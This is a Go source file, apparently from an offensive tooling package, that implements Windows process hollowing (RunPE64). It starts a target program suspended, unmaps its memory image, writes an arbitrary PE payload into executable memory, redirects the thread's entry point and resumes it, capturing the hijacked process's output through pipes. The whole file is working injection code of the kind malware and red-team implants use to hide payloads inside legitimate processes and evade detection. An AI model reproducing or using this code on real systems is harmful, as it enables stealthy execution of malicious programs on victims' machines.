package inject

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func procReadOutput(procInfo *syscall.ProcessInformation,
	stdOutRead, stdOutWrite, stdInWrite, stdInRead, stdErrRead, stdErrWrite syscall.Handle) (error, string, string) {

	// Close the handle to the child process
	errCloseProcHandle := syscall.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		return fmt.Errorf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()), "", ""
	}
	// Close the hand to the child process thread
	errCloseThreadHandle := syscall.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return fmt.Errorf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()), "", ""
	}
	// Close the write handle the anonymous STDOUT pipe
	errCloseStdOutWrite := syscall.CloseHandle(stdOutWrite)
	if errCloseStdOutWrite != nil {
		return fmt.Errorf("[!]Error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite.Error()), "", ""
	}
	// Close the read handle to the anonymous STDIN pipe
	errCloseStdInRead := syscall.CloseHandle(stdInRead)
	if errCloseStdInRead != nil {
		return fmt.Errorf("[!]Error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead.Error()), "", ""
	}
	// Close the write handle to the anonymous STDERR pipe
	errCloseStdErrWrite := syscall.CloseHandle(stdErrWrite)
	if errCloseStdErrWrite != nil {
		return fmt.Errorf("[!]err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite.Error()), "", ""
	}

	// Read STDOUT from child process
	/*
		BOOL ReadFile(
		HANDLE       hFile,
		LPVOID       lpBuffer,
		DWORD        nNumberOfBytesToRead,
		LPDWORD      lpNumberOfBytesRead,
		LPOVERLAPPED lpOverlapped
		);
	*/
	nNumberOfBytesToRead := make([]byte, 1)
	var stdOutBuffer []byte
	var stdOutDone uint32
	var stdOutOverlapped syscall.Overlapped
	for {
		errReadFileStdOut := syscall.ReadFile(stdOutRead, nNumberOfBytesToRead, &stdOutDone, &stdOutOverlapped)
		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
			return fmt.Errorf("[!]Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut.Error()), "", ""
		}
		if int(stdOutDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdOutBuffer = append(stdOutBuffer, b)
		}
	}
	// fmt.Println(fmt.Sprintf("[-]Finished reading %d bytes from STDOUT", len(stdOutBuffer)))

	// Read STDERR from child process
	var stdErrBuffer []byte
	var stdErrDone uint32
	var stdErrOverlapped syscall.Overlapped
	// fmt.Println("[DEBUG]Calling ReadFile on STDERR pipe...")
	for {
		errReadFileStdErr := syscall.ReadFile(stdErrRead, nNumberOfBytesToRead, &stdErrDone, &stdErrOverlapped)
		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
			return fmt.Errorf("[!]Error reading from STDERR pipe:\r\n\t%s", errReadFileStdErr.Error()), "", ""
		}
		if int(stdErrDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdErrBuffer = append(stdErrBuffer, b)
		}
	}
	//	fmt.Println(fmt.Sprintf("[-]Finished reading %d bytes from STDERR", len(stdErrBuffer)))

	return nil, string(stdOutBuffer), string(stdErrBuffer)
}

/* Old:
   RunPE64 - Heavily based on https://github.com/abdullah2993/go-runpe/blob/master/runpe.go
   there are still significant changes compared to original code.
*/
func procPatch(processHandle uintptr, threadHandle uintptr, payload []byte) error {
	var err error

	// Get context of thread.
	var ctx *CONTEXT
	var cbuf [unsafe.Sizeof(*ctx) + 15]byte
	ctx = (*CONTEXT)(unsafe.Pointer((uintptr(unsafe.Pointer(&cbuf[15]))) &^ 15))
	ctx.ContextFlags = CONTEXT_FULL

	err = GetThreadContext(threadHandle, ctx)
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf("GetThreadContext")
	}

	// Get Base Address
	data := make([]byte, 8)
	_, err = ReadProcessMemory(processHandle, uintptr(ctx.Rdx+16), data, 8)
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf("ReadProcessMemory")
	}

	baseAddress := uintptr(binary.LittleEndian.Uint64(data))

	// Get headers of payload
	f, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf("NewFile")
	}

	optionalHeader, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return fmt.Errorf("optionalHeader")
	}

	// Unmap current executable.
	_, err = NtUnmapViewOfSection(processHandle, baseAddress)
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf("NtUnmapViewOfSection")
	}

	// Allocate space for new executable.
	newImageBase := VirtualAllocEx2(processHandle, baseAddress, (uintptr)(optionalHeader.SizeOfImage), 0x00002000|0x00001000, 0x40)

	_, err = WriteProcessMemory2(processHandle, newImageBase, payload, optionalHeader.SizeOfHeaders)
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf("WriteProcessMemory2")
	}

	// Write sections (.text, etc).
	for _, section := range f.Sections {

		sectionData, err := section.Data()
		if err != nil && err.Error() != SUCCESS {
			return fmt.Errorf("Write sections")
		}
		_, err = WriteProcessMemory2(processHandle, newImageBase+(uintptr)(section.VirtualAddress), sectionData, section.Size)
		if err != nil && err.Error() != SUCCESS {
			return fmt.Errorf("Write sections")
		}
	}

	// Write new image base bytes.
	newImageBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(newImageBytes, uint64(newImageBase))
	_, err = WriteProcessMemory2(processHandle, uintptr(ctx.Rdx+16), newImageBytes, 8)
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf(" Write new image base bytes")
	}

	// Set RCX
	ctx.Rcx = uint64(newImageBase) + uint64(optionalHeader.AddressOfEntryPoint)

	// Update thread context.
	err = SetThreadContext(threadHandle, *ctx)
	if err != nil && err.Error() != SUCCESS {
		return fmt.Errorf("Update thread context")
	}

	return nil
}

func RunPE64(payload []byte, target string, replace string, commandLine string) {
	// Create anonymous pipe for STDIN
	var stdInRead syscall.Handle
	var stdInWrite syscall.Handle
	errStdInPipe := syscall.CreatePipe(&stdInRead, &stdInWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdInPipe != nil {
		log.Fatal(fmt.Sprintf("[!]Error creating the STDIN pipe:\r\n%s", errStdInPipe.Error()))
	}
	// Create anonymous pipe for STDOUT
	var stdOutRead syscall.Handle
	var stdOutWrite syscall.Handle
	errStdOutPipe := syscall.CreatePipe(&stdOutRead, &stdOutWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdOutPipe != nil {
		log.Fatal(fmt.Sprintf("[!]Error creating the STDOUT pipe:\r\n%s", errStdOutPipe.Error()))
	}
	// Create anonymous pipe for STDERR
	var stdErrRead syscall.Handle
	var stdErrWrite syscall.Handle
	errStdErrPipe := syscall.CreatePipe(&stdErrRead, &stdErrWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdErrPipe != nil {
		log.Fatal(fmt.Sprintf("[!]Error creating the STDERR pipe:\r\n%s", errStdErrPipe.Error()))
	}

	// Process structures with the pipes, to get its output
	procInfo := &syscall.ProcessInformation{}
	startupInfo := &syscall.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}

	// Create the process.
	// Set inheritHandle = 1 so the pipes work!
	// Add executable to commandline, or arg[0] will not be set...
	_, err := CreateProcessA_Pipe(target, replace+" "+commandLine, 0, 0, 1, 0x00000004, 0, 0, startupInfo, procInfo)
	threadHandle := uintptr(procInfo.Thread)
	processHandle := uintptr(procInfo.Process)

	// Hollow it / Replace it with payload
	err = procPatch(processHandle, threadHandle, payload)
	if err != nil {
		fmt.Printf("Error: %s", err.Error())
	}

	// Start process
	err = ResumeThread(threadHandle)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	// Get output from process
	err, stdOut, stdErr := procReadOutput(procInfo, stdOutRead, stdOutWrite, stdInWrite, stdInRead, stdErrRead, stdErrWrite)
	if err != nil {
		fmt.Printf("Error: %s", err.Error())
	}

	fmt.Printf("\n")
	fmt.Printf("Stdout: %s\n", stdOut)
	fmt.Printf("Stderr: %s\n", stdErr)
}
